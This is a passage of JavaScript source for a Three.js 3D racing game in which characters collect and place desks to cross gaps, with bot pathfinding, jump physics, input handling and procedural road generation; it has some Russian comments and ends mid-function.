PROJECT.PRT.MAIN=function(app)
{
    var here=this;
    here.app=app;    
    here.is_down=false;
    here.mouse_x=0;
    here.mouse_y=0;
    here.game_state="start";
    
    
    var raycaster = new THREE.Raycaster();
    var mouse = new THREE.Vector2();

    here.on_continue=null;
    here.quaternion = new THREE.Quaternion();
    here.tmp = new THREE.Vector3(0,1,0);
    here.vector = new THREE.Vector3(0,0,0);
    here.focal = new THREE.Vector3(0,0,0);
    here.zero = new THREE.Vector3(0,0,0);
    here.current_level=1;
    here.snd=true;
    here.tk=0;
    here.multi_tk=1;
    here.colors=["#FF7328","#FF473A","#AF001A","#FF3884","#FF0F9B","#B72F95","#D028FF","#8F63FF","#3D3DFF","#4D659E","#44C7FF","#404040","#00D3DB","#1D915D","#00D81C","#669E40","#000000","#FF8C3F"];
    here.hero=null;
    here.angle=0;
    here.length=0;
    here.x=0;
    here.y=0;
    here.u=0;
    here.platforms=[];
    here.desks=[];
    here.bonuses=[];
    here.mul_objects=[];
    here.bots=[];
    here.stack_bots=[];
    here.path=[];
    here.finish_id=0;
    here.start=null;
    here.finish=null;
    here.finish_vorota=null;
    here.key_x=0;

    var PLATFORM_DELTA=5;
    var PLATFORM_P=0.93;
    var BONUS_P=0.5;//вероятность доски
    var BONUS_CNT=8;//минимальное расстояние между досками в сегментах
    var BONUS_PAUSE=1200;//пауза восстановления после сьедения
    var STEP_LEN=0.102;
    var FIN_LEN=2;
    var FIN_ADD_LEN=0.25;
    var MIN_RAD_TO_PUSH=0.25;
    var PUSH_FORCE=0.35;
    var AI_TARGET_LEN=5;
    var AI_TARGET_LEN_RND=17;
    var AI_RISK_LEN=2;
    var AI_RISK_LEN_RND=2;
    var AI_DESK_DIVIDE_LEN=5;
    var AI_MIN_DESK=4.5;//до этого только прибаляем
    var AI_MAX_DESK=12;//пытаемся скакать
    var AI_MIDDLE_STEP=2;
    var AI_BIG_STEP=5;
    var KEY_SPEED=2;
    var MOUSE_SPEED=0.01;
    var START_JUMP_A=8;

    function isLocked()
    {
        return  here.app.renderer.domElement === document.pointerLockElement ||
                here.app.renderer.domElement === document.mozPointerLockElement ||
                here.app.renderer.domElement === document.webkitPointerLockElement;
    }

    function moveCallback(e) 
    {
        var x = e.movementX ||
                e.mozMovementX ||
                e.webkitMovementX ||
                0;
      
        var y = e.movementY ||
                e.mozMovementY ||
                e.webkitMovementY ||
                0;
      
        here.gui.wnd.cur.x+=x;
        here.gui.wnd.cur.y+=y;

        if (here.gui.wnd.cur.x<-here.app.dx)
            here.gui.wnd.cur.x=-here.app.dx;
        if (here.gui.wnd.cur.x>here.app.dx+PROJECT.DAT.width-here.gui.wnd.cur.p_w)
            here.gui.wnd.cur.x=here.app.dx+PROJECT.DAT.width-here.gui.wnd.cur.p_w;

        if (here.gui.wnd.cur.y<0)
            here.gui.wnd.cur.y=0;
        if (here.gui.wnd.cur.y>PROJECT.DAT.height-here.gui.wnd.cur.p_h)
            here.gui.wnd.cur.y=PROJECT.DAT.height-here.gui.wnd.cur.p_h;


        if ((here.game_state=="run")&&(here.gui.wnd.cur.visible))
            here.hero.change_angle(x*MOUSE_SPEED);
    }

    function on_pointerlock_change(e)
    {
        here.gui.wnd.cur.visible=isLocked();
        if (here.gui.wnd.cur.visible)
        {
            here.app.renderer.domElement.addEventListener("mousemove", moveCallback, false);
            here.gui.wnd.cur.x=PROJECT.DAT.width/2;
            here.gui.wnd.cur.y=PROJECT.DAT.height/2;
        }
    }

    here.onDown=function(data)
    {
        if((here.msg)||(here.app.busy>0))
            return;
        switch (data.keyCode)
        {
            case 37://left
            case 65://A
                if (here.game_state=="run")
                {
                    here.key_x=1;
                }
                
                //data.stopPropagation();
                //data.preventDefault();
                break;
            case 39://right
            case 68://D
                if (here.game_state=="run")
                {
                    here.key_x=-1;
                }
                
                //data.stopPropagation();
                //data.preventDefault();
                break;
        }         
    }

    here.onUp=function(data)
    {
        switch (data.keyCode)
        {
            case 37://left
            case 65://A
                here.key_x=0;
                
                if (here.app.busy==0)
                {
                    if (here.gui.msg)
                    {
                        if (here.gui.msg.btn_l)
                            here.gui.msg.btn_l.avk.on_click();
                    }
                }
                break;
            case 39://right
            case 68://D
                here.key_x=0;

                if (here.app.busy==0)
                {
                    if (here.gui.msg)
                    {
                        if (here.gui.msg.btn_r)
                            here.gui.msg.btn_r.avk.on_click();
                    }
                }
                break;
            case 13://Enter
                if (here.app.busy==0)
                {
                    if (here.gui.msg)
                    {
                        if (here.gui.msg.btn_cont)
                            here.gui.msg.btn_cont.avk.on_click();
                        else if (here.gui.msg.btn_rep)
                            here.gui.msg.btn_rep.avk.on_click();
                        else if (here.gui.msg.btn_replay)
                            here.gui.msg.btn_replay.avk.on_click();
                        else if (here.gui.msg.btn_back)
                            here.gui.msg.btn_back.avk.on_click();
                    }
                }
                
                break;
        }
    }

    function AVK_UNIT(bot)
    {
        var loc=this;
        loc.id=here.stack_bots.length;
        here.stack_bots.push(loc);
        loc.is_bot=bot;
        loc.target_angle=loc.angle=Math.PI/2;
        loc.speed=3;
        loc.speed_mul=1;
        loc.jump_a=START_JUMP_A;
        loc.desk_speed_mul=1.25;
        loc.jump_speed_mul=1.5;
        loc.desk_cnt=0;
        loc.showed_desk_cnt=0;
        loc.jump_time=false;
        loc.in_air=false;
        loc.v=0;
        loc.y=0;
        loc.desk_x=0;
        loc.desk_y=0;
        loc.die=false;
        loc.hero_id=Math.floor(Math.random()*10);
        loc.boat_id=Math.floor(Math.random()*11);
        loc.heat_id=Math.floor(Math.random()*11);
        loc.last_mul=null;
        loc.desks=[];
        loc.finish_id=-1;
        loc.have_finished=false;
        loc.nick=PROJECT.DAT.nicks[Math.floor(Math.random()*PROJECT.DAT.nicks.length)]

        loc.obj=new THREE.Group();
        if (!bot)
        {
            loc.nick=PROJECT.STR.player;
            loc.geo=here.app.get_object("geo");
            loc.obj.add(loc.geo);
            loc.txt=here.app.get_text(loc.nick,32,"#0C81FF");
        }else loc.txt=here.app.get_text(loc.nick,32,here.colors[Math.floor(Math.random()*here.colors.length)]);

        loc.txt.material.depthTest=false;
        loc.txt.material.depthWrite=false;
        loc.txt.scale.set(0.004,0.004,0.004);
        loc.txt.position.y=0.75;
        loc.obj.add(loc.txt);

        loc.man=here.app.get_fbx("child_0"+loc.hero_id);
        loc.man.unit=loc;
        loc.man.material.color.r=0.95;
        loc.man.material.color.g=0.95;
        loc.man.material.color.b=0.95;
        loc.man.position.set(0,0.03,0);
        loc.man.scale.set(0.2,0.2,0.2)
        loc.man.play_other("mixamo.com",here.anim_run);
        loc.man.mixer.update(25);

        loc.hand_bone=new THREE.Group();
        loc.hand_bone.position.z=0.2;
        loc.hand_bone.position.y=0.3;
        loc.hand_bone.rotation.x=Math.PI/180*5;
        loc.man.getObjectByName("mixamorig_LeftHand").attach(loc.hand_bone);

        loc.man.stop();
        loc.man.play_other("mixamo.com",here.anim_idle);
        loc.man.mixer.update(Math.floor(12+Math.random()*125));

        here.main_scene.add(loc.obj);
        loc.obj.add(loc.man);
        loc.obj.visible=false;

        loc.boat_left_bone=loc.man.getObjectByName("mixamorig_LeftToeBase");
        loc.boat_right_bone=loc.man.getObjectByName("mixamorig_RightToeBase");
        loc.head_bone=loc.man.getObjectByName("mixamorig_Head");
        loc.path=[];

        loc.reset=function()
        {
            while (loc.path.length>0)
                loc.path.pop();

            loc.target_angle=loc.angle=Math.PI/2;
            loc.speed=3;
            loc.jump_a=START_JUMP_A;
            loc.speed_mul=1;
            loc.desk_speed_mul=1.1;
            loc.jump_speed_mul=1.25;
            loc.desk_cnt=0;
            loc.showed_desk_cnt=0;
            loc.jump_time=false;
            loc.in_air=false;
            loc.v=0;
            loc.y=0;
            loc.desk_x=0;
            loc.desk_y=0;
            loc.die=false;
            loc.last_mul=null;
            loc.finish_id=-1;
            loc.have_finished=false;

            loc.man.stop();
            loc.man.play_other("mixamo.com",here.anim_idle);
            loc.man.mixer.update(Math.floor(12+Math.random()*125));
            loc.obj.visible=false;
            loc.start_desk_cnt=0;
            loc.obj.rotation.y=Math.PI/2-loc.angle;

            if (loc.is_bot)
            {
                loc.hero_id=Math.floor(Math.random()*10);
                loc.boat_id=Math.floor(Math.random()*11);
                loc.heat_id=Math.floor(Math.random()*11);

                loc.refers_view();
            }
            var heat_effect=PROJECT.STR.items[0][loc.heat_id].effect;
            var boat_effect=PROJECT.STR.items[1][loc.boat_id].effect;

            switch (heat_effect.name) 
            {
                case "desk":
                    loc.start_desk_cnt=heat_effect.cnt;
                    break;
                case "speed":
                    loc.speed_mul+=heat_effect.cnt;
                    break;
                case "jump_dist":
                    loc.jump_a+=START_JUMP_A*heat_effect.cnt;
                    break;
                case "jump_speed":
                    loc.jump_speed_mul+=heat_effect.cnt;
                    break;

                default:
                    break;
            }

            switch (boat_effect.name) 
            {
                case "desk":
                    loc.start_desk_cnt+=boat_effect.cnt;
                    break;
                case "speed":
                    loc.speed_mul+=boat_effect.cnt;
                    break;
                case "jump_dist":
                    loc.jump_a+=START_JUMP_A*boat_effect.cnt;
                    break;
                case "jump_speed":
                    loc.jump_speed_mul+=boat_effect.cnt;
                    break;

                default:
                    break;
            }

            loc.refresh_desk();
        }

        function do_ai(tk)
        {
            var x=loc.path[loc.path_id].x;
            var z=loc.path[loc.path_id].z;
            if (loc.desk_cnt<AI_MIN_DESK)
                var delta=Math.floor((AI_TARGET_LEN+Math.floor(Math.random()*AI_TARGET_LEN))/2);
            else var delta=AI_TARGET_LEN+Math.floor(Math.random()*AI_TARGET_LEN_RND);

            if(loc.path_id+delta>=loc.path.length)
            {
                var fin_x=here.finish.position.x;
                var fin_z=here.finish.position.z;
            }else 
            {
                var fin_x=loc.path[loc.path_id+delta].x;
                var fin_z=loc.path[loc.path_id+delta].z;
            }
            

            var fin_len=here.app.get_length(x-fin_x,z-fin_z);
            var bot_fin_len=here.app.get_length(fin_x-loc.obj.position.x,fin_z-loc.obj.position.z);

            var num_ai=0;
            if (bot_fin_len<fin_len)
            {
                if (loc.desk_cnt<AI_MIN_DESK)
                {
                    var i=loc.path_id+1;
                }else if (loc.desk_cnt>AI_MAX_DESK)
                {
                    num_ai=1;
                    for (var i=loc.path_id+AI_BIG_STEP*2;i<loc.path.length;i+=AI_BIG_STEP)
                    {
                        var x=loc.path[i].x;
                        var z=loc.path[i].z;
                        var new_fin_len=here.app.get_length(x-fin_x,z-fin_z);
                        if (new_fin_len<bot_fin_len)
                        {
                            var len=here.app.get_length(x-loc.obj.position.x,z-loc.obj.position.z);
                            var t=i+1;
                            if (t<loc.path.length)
                            {
                                var x=loc.path[t].x;
                                var z=loc.path[t].z;
                                var next_len=here.app.get_length(x-loc.obj.position.x,z-loc.obj.position.z);
                                if (next_len>len)
                                    break;
                            }else break;
                        }
                    }
                }else
                {
                    num_ai=2;
                    for (var i=loc.path_id+1;i<loc.path.length;i+=AI_MIDDLE_STEP)
                    {
                        var x=loc.path[i].x;
                        var z=loc.path[i].z;
                        var new_fin_len=here.app.get_length(x-fin_x,z-fin_z);
                        if (new_fin_len<bot_fin_len)
                        {
                            var len=here.app.get_length(x-loc.obj.position.x,z-loc.obj.position.z);
                            var t=i+1;
                            if (t<loc.path.length)
                            {
                                var x=loc.path[t].x;
                                var z=loc.path[t].z;
                                var next_len=here.app.get_length(x-loc.obj.position.x,z-loc.obj.position.z);
                                if (next_len>len)
                                    break;
                            }else break;
                        }
                    }
                }

                if (i>=loc.path.length)
                    i=loc.path.length-1;

                var x=loc.path[i].x;
                var z=loc.path[i].z;
                var len=here.app.get_length(x-loc.obj.position.x,z-loc.obj.position.z);

                if (len>loc.desk_cnt/AI_DESK_DIVIDE_LEN+AI_RISK_LEN+Math.floor(Math.random()*AI_RISK_LEN_RND))
                {
                    num_ai=3;
                    i=Math.min(loc.path_id+1,loc.path.length-1);
                }

                loc.path_id=i;
                if (loc.id==1)
                {
                    //console.log(num_ai+":"+i+":"+loc.desk_cnt+":"+Math.floor(len));
                }
            }

            var x=loc.path[loc.path_id].x;
            var z=loc.path[loc.path_id].z;
            var a=here.app.get_angle(x-loc.obj.position.x,z-loc.obj.position.z);    
    
            loc.target_angle=a;

            if (loc.angle!=loc.target_angle)
            {
                while (loc.target_angle-loc.angle>Math.PI)
                    loc.target_angle-=Math.PI*2;

                while (loc.target_angle-loc.angle<-Math.PI)
                    loc.target_angle+=Math.PI*2;

                if (loc.target_angle>loc.angle)
                {
                    loc.angle+=tk/200;
                    if (loc.target_angle<=loc.angle)
                        loc.angle=loc.target_angle;
                }else
                {
                    loc.angle-=tk/200;
                    if (loc.target_angle>=loc.angle)
                        loc.angle=loc.target_angle;
                }
            }

            loc.obj.rotation.y=Math.PI/2-loc.angle;
        }

        loc.make_path=function()
        {
            while (loc.path.length>0)
                loc.path.pop();

            for (var i=loc.path_id;i<here.path.length;i+=4)
            {
                loc.path.push({x:here.path[i][0].x+(here.path[i][1].x-here.path[i][0].x)*loc.path_pr,z:here.path[i][0].z+(here.path[i][1].z-here.path[i][0].z)*loc.path_pr,a:here.path[i][2]});
            }

            loc.path.push({x:here.finish.position.x,z:here.finish.position.z,a:here.angle});
            loc.path_id=1;
        }    
        
        loc.refers_view=function()
        {
            if (loc.man)
                loc.man.free();

            loc.man=here.app.get_fbx("child_0"+loc.hero_id);

            if (loc.is_bot)
            {
                loc.nick=PROJECT.DAT.nicks[Math.floor(Math.random()*PROJECT.DAT.nicks.length)]
            }else loc.nick=PROJECT.STR.player;
            
            loc.txt.text=loc.nick;
            loc.man.unit=loc;
            loc.man.material.color.r=0.95;
            loc.man.material.color.g=0.95;
            loc.man.material.color.b=0.95;
            loc.man.rotation.set(0,0.03,0);
            loc.man.position.set(0,0.03,0);
            loc.man.scale.set(0.2,0.2,0.2)
            loc.man.stop();
            loc.man.play_other("mixamo.com",here.anim_run);
            loc.man.mixer.update(25);
    
            loc.hand_bone.parent.remove(loc.hand_bone);
            loc.hand_bone=null;
            loc.hand_bone=new THREE.Group();
            loc.hand_bone.position.z=0.2;
            loc.hand_bone.position.y=0.3;
            loc.hand_bone.rotation.x=Math.PI/180*5;
            loc.man.getObjectByName("mixamorig_LeftHand").attach(loc.hand_bone);
    
            loc.man.stop();
            loc.man.play_other("mixamo.com",here.anim_idle);
            loc.man.mixer.update(Math.floor(12+Math.random()*125));
    
            loc.obj.add(loc.man);
    
            loc.boat_left_bone=loc.man.getObjectByName("mixamorig_LeftToeBase");
            loc.boat_right_bone=loc.man.getObjectByName("mixamorig_RightToeBase");
            loc.head_bone=loc.man.getObjectByName("mixamorig_Head");

            if (loc.left_boat)
                loc.left_boat.free();

            if (loc.right_boat)
                loc.right_boat.free();

            if (loc.heat)
                loc.heat.free();

            function refresh_mesh(mesh)
            {
                mesh.material.color.r=0.95;
                mesh.material.color.g=0.95;
                mesh.material.color.b=0.95;
                mesh.geometry.computeVertexNormals();
            }

            loc.left_boat=here.app.get_object("boat_"+loc.boat_id);
            loc.left_boat.position.y=-7;
            loc.left_boat.position.z=-10;
            loc.left_boat.rotation.x=Math.PI/2;
            loc.left_boat.rotation.y=Math.PI;
            loc.left_boat.scale.x=loc.left_boat.scale.y=loc.left_boat.scale.z=15;
            refresh_mesh(loc.left_boat);
            loc.boat_left_bone.add(loc.left_boat);

            loc.right_boat=here.app.get_object("boat_"+loc.boat_id);
            loc.right_boat.position.y=-7;
            loc.right_boat.position.z=-10;
            loc.right_boat.rotation.x=Math.PI/2;
            loc.right_boat.rotation.y=Math.PI;
            loc.right_boat.scale.x=loc.right_boat.scale.y=loc.right_boat.scale.z=15;
            refresh_mesh(loc.right_boat);
            loc.boat_right_bone.add(loc.right_boat);
            
            loc.heat=here.app.get_object("heat_"+loc.heat_id);
            loc.heat.position.y=PROJECT.STR.items[0][loc.heat_id].pos[0];
            loc.heat.position.z=PROJECT.STR.items[0][loc.heat_id].pos[1];
            loc.heat.rotation.x=PROJECT.STR.items[0][loc.heat_id].pos[2];
            loc.heat.rotation.y=loc.heat.rotation.z=0;
            loc.heat.scale.x=loc.heat.scale.y=loc.heat.scale.z=PROJECT.STR.items[0][loc.heat_id].pos[3];
            refresh_mesh(loc.heat);
            loc.head_bone.add(loc.heat);
        }

        loc.refers_view();

        //loc.hand_bone.scale.x=loc.hand_bone.scale.y=loc.hand_bone.scale.z=350;
        //loc.hand_bone.position.y=0;
        //loc.hand_bone.position.x=0;
        //loc.hand_bone.position.z=0;
        
        function jump(effect)
        {
            if((loc.jump_time)||(loc.die))
                return false;
            loc.jump_time=true;
            loc.v=loc.jump_a*effect;
            loc.y=0;

            return true;
        }

        loc.jump=jump;

        loc.refresh_desk=function()
        {
            while (loc.desks.length>loc.desk_cnt)
                loc.desks.pop().free();
            
            for (var i=loc.desks.length;i<loc.desk_cnt;i++)
            {
                var desk=here.app.get_object("desk");
                desk.scale.y=0.4;
                desk.scale.x=0.7;
                desk.scale.z=0.7;
                loc.hand_bone.add(desk);
                desk.position.set(0,i/32,0);
                loc.desks.push(desk);

                if (i>=loc.showed_desk_cnt)
                {
                    function on_progress(obj,progress,current_tk,action)
                    {
                        obj.position.y=obj.start_y+(obj.finish_y-obj.start_y)*progress*progress;
                        obj.material.opacity=progress;
                    }
        
                    function on_finish(obj,action,manual_stop)
                    {
                        obj.avk_action=null;
                        obj.position.y=obj.finish_y;
                        obj.material.opacity=1;
                        obj.material.transparent=false;
                    }                    
        
                    desk.position.y=desk.start_y=i/32+(i-loc.showed_desk_cnt+1)*(4/32);
                    desk.finish_y=i/32;
                    desk.material.transparent=true;
                    desk.material.opacity=0;
                    desk.avk_action=here.app.start(desk,0,(i-loc.showed_desk_cnt+1)*50,null,on_progress,on_finish);
                }
            }

            loc.showed_desk_cnt=loc.desk_cnt;

            if (!loc.is_bot)
            {
                here.app.camera_3d.position.y=2+loc.desk_cnt/100;
                here.app.camera_3d.position.z=-4-+loc.desk_cnt/50;
            }
            
        }

        loc.refresh_desk();

        loc.change_angle=function(a)
        {
            loc.angle+=a;
            loc.obj.rotation.y-=a;
        }

        function verify_bonus()
        {
            for (var i=0;i<here.bonuses.length;i++)
            {
                var bonus=here.bonuses[i];
                if ((bonus.die_pause<=0)&&(Math.abs(bonus.position.x-loc.obj.position.x)<0.4)&&(Math.abs(bonus.position.z-loc.obj.position.z)<0.4))
                {
                    loc.desk_cnt+=bonus.desk_cnt;
                    loc.refresh_desk();
                    bonus.visible=false;
                    bonus.die_pause=BONUS_PAUSE;
                    
                    return;
                }
            }
        }

        function fall(tk)
        {
            loc.v-=9.81*tk/1000;
            loc.y+=loc.v*tk/1000;
            loc.obj.position.set(loc.obj.position.x,loc.y,loc.obj.position.z);
        }

        loc.finish=function()
        {
            if(loc.have_finished)
                return;

            loc.finish_id=here.finish_id;
            here.finish_id++;
            loc.have_finished=true;

            if (loc.is_bot)
            {
                loc.desk_cnt=0;
                loc.refresh_desk();
                
                if (loc.finish_id==0)
                {
                    loc.finish_x=here.finish.position.x;
                    loc.finish_z=here.finish.position.z;
                }else 
                {
                    var r=Math.random()*Math.PI*2;
                    loc.finish_x=here.finish.position.x+Math.cos(r)*(0.75+loc.finish_id/5);
                    loc.finish_z=here.finish.position.z+Math.sin(r)*(0.75+loc.finish_id/5);
                }

                function on_progress(obj,progress,current_tk,action)
                {
                    loc.obj.position.x=loc.start_x+(loc.finish_x-loc.start_x)*progress;
                    loc.obj.position.z=loc.start_z+(loc.finish_z-loc.start_z)*progress;
                }
        
                function on_finish(obj,action,manual_stop)
                {
                    loc.man.stop();

                    if (loc.finish_id==0)
                        loc.man.play_other("mixamo.com",here.anim_dance);
                    else loc.man.play_other("mixamo.com",here.anim_idle);

                    loc.avk_action=null;
                }

                loc.start_x=loc.obj.position.x;
                loc.start_z=loc.obj.position.z;

                var a=here.app.get_angle(loc.finish_x-loc.start_x,loc.finish_z-loc.start_z);
    
                loc.angle=loc.target_angle=a;
                loc.obj.rotation.y=Math.PI/2-loc.angle;

                var l=here.app.get_length(loc.obj.position.x-loc.finish_x,loc.obj.position.z-loc.finish_z);
                loc.avk_action=here.app.start(null,0,Math.floor(l/(loc.speed*loc.speed_mul)*1000),null,on_progress,on_finish);
            }else
            {
                on_fin(loc.finish_id==0);
            }
        }

        loc.do_step=function(tk)
        {
            if ((loc.is_bot)&&(loc.have_finished))
            {
                loc.man.mixer.update(1*tk/1000);
                return;
            }

            if (loc.is_bot)
            {
                do_ai(tk);
            }else loc.geo.rotation.y-=tk/200;

            if (loc.die)
            {
                fall(tk);
                return;
            }

            var len=loc.speed*loc.speed_mul*tk/1000;
            var just_jump=false;

            if (loc.jump_time)
            {
                loc.man.mixer.update(0.5*tk/1000);

                loc.v-=9.81*tk/1000;
                loc.y+=loc.v*tk/1000;
                len*=loc.jump_speed_mul;
                
                if (loc.y<=0)
                {
                    loc.y=0;
                    just_jump=true;
                    loc.jump_time=false;
                }
            }else
            {
                if (loc.in_air)
                    len*=loc.desk_speed_mul;
                loc.man.mixer.update(1.55*tk/1000);
            }

            loc.obj.position.set(loc.obj.position.x+Math.cos(loc.angle)*len,loc.y,loc.obj.position.z+Math.sin(loc.angle)*len);

            if (!loc.jump_time)
            {
                start_dust(loc.obj.position);
                for (var i=0;i<here.stack_bots.length;i++)
                {
                    var bot=here.stack_bots[i];

                    if ((bot!=loc)&&(here.app.get_length(loc.obj.position.x-bot.obj.position.x,loc.obj.position.z-bot.obj.position.z)<MIN_RAD_TO_PUSH))
                    {
                        if (bot.jump(PUSH_FORCE))
                            loc.obj.position.set((loc.obj.position.x*4+bot.obj.position.x)/5,loc.obj.position.y,(loc.obj.position.z*4+bot.obj.position.z)/5);
                    }
                }

                here.vector.set(0,-1,0);
                var pnt=loc.obj.position.clone();
                pnt.y=1;
                raycaster.set(pnt,here.vector);
                var intersects = raycaster.intersectObjects(here.ground.children,true);

                if (intersects.length>0)
                    var ground=intersects[0];
                else var ground=null;
                    
                if (ground)
                {
                    loc.in_air=false;
                    switch (ground.object.tag) 
                    {
                        case "fin_x_tag":
                            if (loc.last_mul!==ground.object)
                            {
                                loc.last_mul=ground.object;
                                start_sled(ground.object.position,1);
                                down_platform(loc.last_mul);
                            }
                            break;
                        case "finish_tag":
                            loc.finish();
                            break;
                        case "platform_tag":
                            start_sled(ground.object.position,0.5);
                            down_platform(ground.object);
                            jump(1);
                            break;
                    
                        default:
                            break;
                    }

                    if (just_jump)
                    {
                    }

                    loc.obj.position.y=0;
                    verify_bonus();
                }else 
                {
                    loc.in_air=true;
                    if (loc.desk_cnt>0)
                    {
                        loc.desk_cnt--;
                        loc.refresh_desk();
                        loc.obj.position.y=0;

                        var obj=here.app.get_object("desk");
                        obj.tag="desk_tag";

                        var l=here.app.get_length(loc.desk_x-loc.obj.position.x,loc.desk_y-loc.obj.position.z);
                        if (l>STEP_LEN*2)
                        {
                            loc.desk_x=loc.obj.position.x;
                            loc.desk_y=loc.obj.position.z;

                            obj.position.set(loc.desk_x,loc.obj.position.y,loc.desk_y);
                        }else
                        {
                            l=STEP_LEN*2-l;
                            loc.desk_x=loc.obj.position.x+Math.cos(loc.angle)*l;
                            loc.desk_y=loc.obj.position.z+Math.sin(loc.angle)*l;
                            
                            obj.position.set(loc.desk_x,loc.obj.position.y,loc.desk_y);
                        }
                        
                        obj.rotation.set(loc.obj.rotation.x,loc.obj.rotation.y,loc.obj.rotation.z);

                        here.desks.push(obj);
                        here.ground.add(obj);

                        if (just_jump)
                        {
                        }
                    }else
                    {
                        if (just_jump)
                        {
                            if (loc.last_mul)
                            {
                                function on_progress(obj,progress,current_tk,action)
                                {
                                    loc.obj.position.x=loc.start_position.x+(loc.last_mul.position.x-loc.start_position.x)*progress;
                                    loc.obj.position.z=loc.start_position.z+(loc.last_mul.position.z-loc.start_position.z)*progress;
                                    loc.obj.position.y=Math.sin(Math.PI*progress);
                                }
                        
                                function on_finish(obj,action,manual_stop)
                                {
                                    loc.avk_action=null;
                                    loc.obj.position.y=0;
                                    on_win();
                                }
                                loc.start_position=loc.obj.position.clone();
                                loc.avk_action=here.app.start(null,0,400,null,on_progress,on_finish,true);
                            }else
                            {
                                loc.die=true;
                                on_fail(loc);
                            }
                        }else jump(0.5);
                        //loc.obj.position.y=-0.2;
                    }
                }
            }
        }
    }

    function init_random()
    {
        var v=[0,2,7,9,23,25,34,36,47,52,54,57,59,61,65,67,69,70,75,78,79,82,84,85,87,89,92,93,96,98,99,23159];
        here.rand=v[Math.floor(Math.random()*v.length)];//119087654;
        //console.log(here.rand);
    }
    
    here.get_position=function(unit)
    {
        return 0;
    }

    here.random=function()
    {//реализация рандома
        var n1 = 214013;
        var n2 = 2531011;
        here.rand = (here.rand * n1 + n2)>>32;
        
        var r=(((here.rand) & 0x7fffffff) % 10000)/10000;
        if (r>1)
            r=0;
        return r;//Math.random();
    }

    function coord(x,y)
    {
        var width = PROJECT.DAT.width+here.app.dx*2;
        var height = PROJECT.DAT.height;
    
        mouse.x=x+here.app.dx;
        mouse.y=y;

        mouse.x = (mouse.x/width)*2-1;
        mouse.y = 1-(mouse.y/height)*2;
    }
    
    function play(name)
    {
        if (!here.snd)
            return;
        if (here.app.sounds[name].isPlaying)
            return;
        here.app.sounds[name].play();
        here.app.sounds[name].setVolume(here.snd_vol);
    }

    function get_objects(x,y)
    {
        coord(x,y);
        raycaster.setFromCamera(mouse, here.app.camera_3d);        
        return raycaster.intersectObjects(here.main_scene.children,true);
    }

    function on_down(obj,x,y,button)
    {
        here.gui.show_hint(false);

        here.is_down=true;

        here.mouse_x=x;
        here.mouse_y=y;

        if (here.app.busy>0)
            return;

        var objs=get_objects(x,y);
    }

    function on_up(obj,x,y,button)
    {
        here.is_down=false;

        here.mouse_x=x;
        here.mouse_y=y;
    }

    function on_move(obj,x,y,button)
    {
        if (here.is_down)
        {
            //here.app.camera_3d.position.x+=(x-here.mouse_x)/10;
            //here.app.camera_3d.position.z+=(y-here.mouse_y)/10;
            if (here.game_state=="run")
                here.hero.change_angle((x-here.mouse_x)*MOUSE_SPEED);
        }

        here.mouse_x=x;
        here.mouse_y=y;
    }

    function first_show()
    {//начало игры перед тем, как закроем прелоадер
        //свет
        var light = new THREE.AmbientLight(0xffffff,0.75); // soft white light
        here.app.scene_3d.add(light);

        var directionalLight = new THREE.DirectionalLight(0xFFD8F9,0.65);
        directionalLight.position.set(0,250,-150);
        directionalLight.target.position.set(0,0,0);
        here.app.scene_3d.add(directionalLight);
        here.app.scene_3d.background=here.app.sky_texture;

        //постоянные объекты сцены
        here.global_scene=new THREE.Group();
        here.app.app_gfx.add(here.global_scene);

        here.main_scene=new THREE.Group();
        here.global_scene.add(here.main_scene);
    }

    function add_segment(geometry,len,alpha)
    {
        here.angle+=alpha;
        here.x+=Math.cos(here.angle+Math.PI/2)*len;
        here.y+=Math.sin(here.angle+Math.PI/2)*len;

        var x0=Math.cos(here.angle+Math.PI)+here.x;
        var x1=Math.cos(here.angle)+here.x;
        var z0=Math.sin(here.angle+Math.PI)+here.y;
        var z1=Math.sin(here.angle)+here.y;

        here.path.push([{x:x0,z:z0},{x:x1,z:z1},here.angle]);
        var i=geometry.vertices.length-4;

        geometry.vertices.push
        (
            new THREE.Vector3(x0, -1,  z0),  // 4
            new THREE.Vector3(x0, 0,  z0),  // 5
            new THREE.Vector3(x1,  0,  z1),  // 6
            new THREE.Vector3(x1,  -1,  z1),  // 7
        );

        geometry.faces.push
        (
            new THREE.Face3(i+0, i+4, i+5),
            new THREE.Face3(i+0, i+5, i+1),
            
            new THREE.Face3(i+1, i+5, i+6),
            new THREE.Face3(i+1, i+6, i+2),
            
            new THREE.Face3(i+2, i+6, i+7),
            new THREE.Face3(i+2, i+7, i+3),
        );

        len/=2;
        geometry.faceVertexUvs[0].push
        (
            [ new THREE.Vector2(0, here.u), new THREE.Vector2(0, here.u+len), new THREE.Vector2(0.25, here.u+len) ],
            [ new THREE.Vector2(0, here.u), new THREE.Vector2(0.25, here.u+len), new THREE.Vector2(0.25, here.u) ],

            [ new THREE.Vector2(0.25, here.u), new THREE.Vector2(0.25, here.u+len), new THREE.Vector2(0.75, here.u+len) ],
            [ new THREE.Vector2(0.25, here.u), new THREE.Vector2(0.75, here.u+len), new THREE.Vector2(0.75, here.u) ],

            [ new THREE.Vector2(0.75, here.u), new THREE.Vector2(0.75, here.u+len), new THREE.Vector2(1, here.u+len) ],
            [ new THREE.Vector2(0.75, here.u), new THREE.Vector2(1, here.u+len), new THREE.Vector2(1, here.u) ]
        );

        here.u+=len;
        while (here.u>=1)
            here.u--;
    }

    function clear_level()
    {
        here.finish_id=0;
        if (here.geometry)
        {
            here.road.parent.remove(here.road);
            here.geometry.dispose();
        }

        while(here.platforms.length>0)
            here.platforms.pop().free();
            
        while(here.desks.length>0)
            here.desks.pop().free();

        while(here.bonuses.length>0)
            here.bonuses.pop().free();

        while(here.mul_objects.length>0)
            here.mul_objects.pop().free();

        while(here.path.length>0)
            here.path.pop();

        here.length=0;
        here.x=0;
        here.y=0;
        here.u=0;
    }

    function init_level()
    {
        clear_level()
        here.geometry = new THREE.Geometry();

        init_random();

        var x0=Math.cos(here.angle+Math.PI)+here.x;
        var x1=Math.cos(here.angle)+here.x;
        var z0=Math.sin(here.angle+Math.PI)+here.y;
        var z1=Math.sin(here.angle)+here.y;
        
        here.geometry.vertices.push
        (
            new THREE.Vector3(x0, -1,  z0),  // 0
            new THREE.Vector3(x0, 0,  z0),  // 1
            new THREE.Vector3(x1,  0,  z1),  // 2
            new THREE.Vector3(x1,  -1,  z1),  // 3
        );

        var f=false;
        for (var i=0;i<35;i++)
        {
            if (i>0)
            {
                var prev_a=a;
            }

            var a=(here.random()-0.5)*Math.PI/180*20;
            if ((Math.abs(a)/Math.PI*180<2)||(i<1))
                a=0;

            if (i>0)
            {
